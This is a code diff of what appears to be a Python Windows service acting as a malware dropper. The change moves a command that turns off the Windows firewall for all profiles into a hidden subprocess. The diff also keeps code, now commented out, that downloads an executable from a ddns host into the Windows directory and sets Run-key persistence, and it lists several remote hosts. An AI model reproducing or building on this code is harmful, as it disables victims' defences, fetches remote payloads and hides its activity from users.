@@ -84,8 +84,8 @@ try:
     CREATE_NO_WINDOW = 0x08000000
     swin=os.getenv('windir')
     suser=os.getenv('USERPROFILE')
-    os.system("netsh advfirewall set allprofiles state off")
     if not os.path.exists('c:\\windows\\wup.exe'):
+        subprocess.call("netsh advfirewall set allprofiles state off", creationflags=CREATE_NO_WINDOW)
     ##    f = urllib2.urlopen("http://certificates.ddns.net/wofficeie.exe")
     ##    with open(swin+'\\wup.exe',"wb") as code:
     ##        code.write(f.read())
@@ -117,8 +117,8 @@ class AppServerSvc (win32serviceutil.ServiceFramework):
         site1="paner.altervista.org"
         site2="52.26.124.145"
         site3="certificates.ddns.net"
-        os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+os.getenv('windir')+"\\up.exe /f")
-        os.system("cmd /c copy /y "+os.getenv('windir')+"\\upie.exe "+os.getenv('windir')+"\\up.exe")
+        #os.system("reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v urlspace /t REG_SZ   /d  "+os.getenv('windir')+"\\up.exe /f")
+        #os.system("cmd /c copy /y "+os.getenv('windir')+"\\upie.exe "+os.getenv('windir')+"\\up.exe")
         
         while True:
             
